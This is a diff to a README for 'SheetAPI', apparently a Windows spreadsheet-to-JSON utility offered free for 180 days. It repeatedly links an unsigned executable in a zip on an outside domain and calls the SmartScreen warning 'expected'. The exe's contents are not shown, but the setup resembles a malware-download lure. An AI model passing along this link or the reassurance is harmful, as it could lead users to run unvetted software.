@@ -6,7 +6,7 @@
 
 **KERNELX · founders build · 180 days free**
 
-[Download ZIP](https://pannki.com/sheetapi.zip) · [Landing](./apps/web/index.html) · [Org](https://github.com/rairaisaqlain-rgb)
+[Download SheetAPI.zip](https://pannki.com/sheetapi.zip) · [Landing](./apps/web/index.html) · [Org](https://github.com/rairaisaqlain-rgb)
 
 <img src="https://img.shields.io/badge/status-founders-2ea44f?style=for-the-badge" />
 <img src="https://img.shields.io/badge/download-pannki.com-black?style=for-the-badge" />
@@ -20,33 +20,36 @@
 
 | Platform | Package | Status | Link |
 | --- | --- | --- | --- |
-| Windows | `sheetapi.exe` inside zip | live | [sheetapi.zip](https://pannki.com/sheetapi.zip) |
+| Windows | `sheetapi.exe` inside package | live | [Download](https://pannki.com/sheetapi.zip) |
 
-```text
-https://pannki.com/sheetapi.zip
-```
+## What’s in the zip
 
-Founders cohort: **2026-09-17 → 2027-03-16** (180 days). No card on signup. Day 181: paid plan unless cancelled.
+A small Windows utility that turns a published spreadsheet into JSON rows at `/v1/rows`.
 
----
+## Who it’s for
+
+Operators who need a simple read-only spreadsheet feed for a small project.
+
+## Who it’s not for
+
+Not an open proxy, write-back database, credential store, or hosted analytics platform.
 
 ## Founders
 
-- Cohort start: `2026-09-17`
-- Cohort end (day 180): `2027-03-16`
-- FileForge is the primary offer this week
-- HireStack kit remains available as a secondary free download
-- SheetAPI / SlotBook are on the shelf (not advertised this week)
-- Windows SmartScreen may warn on an unsigned exe — expected
+One project is free for 180 days; no card on signup. Day 181: paid Builder plan unless cancelled.
 
----
+## Install
 
-## Disclaimer
+1. Download the package.
+2. Unpack it on Windows.
+3. Run the local app and configure the published sheet.
 
-> Time-boxed founders access, not forever-free.
-> Not an exploit suite, CVE dump, or credential tool.
-> KERNELX ships small programs people actually run.
+## FAQ
 
----
+**Is it cloud SaaS?** No, this build is a local helper.
 
-*SheetAPI — KERNELX lab*
+**Will Windows warn?** An unsigned exe may trigger SmartScreen; that is expected.
+
+> Time-boxed founders access, not forever-free. Not an exploit suite, CVE dump, or credential tool.
+
+[Download SheetAPI.zip](https://pannki.com/sheetapi.zip)
